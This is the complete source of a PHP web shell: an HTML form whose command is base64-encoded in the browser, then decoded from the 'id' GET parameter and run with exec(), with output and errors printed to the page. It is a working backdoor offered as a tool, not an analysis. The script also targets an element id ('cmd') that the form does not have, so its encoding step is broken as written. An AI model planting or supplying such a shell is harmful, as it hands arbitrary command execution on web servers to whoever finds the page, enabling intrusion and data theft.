<title>PHP Web Shell</title>
<html>
<body>
    <!-- Replaces command with Base64-encoded Data -->
    <script>
    window.onload = function() {
        document.getElementById('execute_form').onsubmit = function () {
            var command = document.getElementById('cmd');
            command.value = window.btoa(command.value);
        };
    };
    </script>
    
    <!-- HTML Form for inputting desired command -->
    <form id="execute_form" autocomplete="off">
        <b>Command</b><input type="text" name="id" id="id" autofocus="autofocus" style="width: 500px" />
        <input type="submit" value="Execute" />
    </form>
    
    <!-- PHP code that executes command and outputs cleanly -->
    <?php
        $decoded_command = base64_decode($_GET['id']);
        echo "<b>Executed:</b>  $decoded_command";
        echo str_repeat("<br>",2);
        echo "<b>Output:</b>";
        echo str_repeat("<br>",2);
        exec($decoded_command . " 2>&1", $output, $return_status);
        if (isset($return_status)):
            if ($return_status !== 0):
                echo "<font color='red'>Error in Code Execution -->  </font>";
                foreach ($output as &$line) {
                    echo "$line <br>";
                };
            elseif ($return_status == 0 && empty($output)):
                echo "<font color='green'>Command ran successfully, but does not have any output.</font>";
            else:
                foreach ($output as &$line) {
                    echo "$line <br>";
                };
            endif;
        endif;
    ?>
</body>
</html>
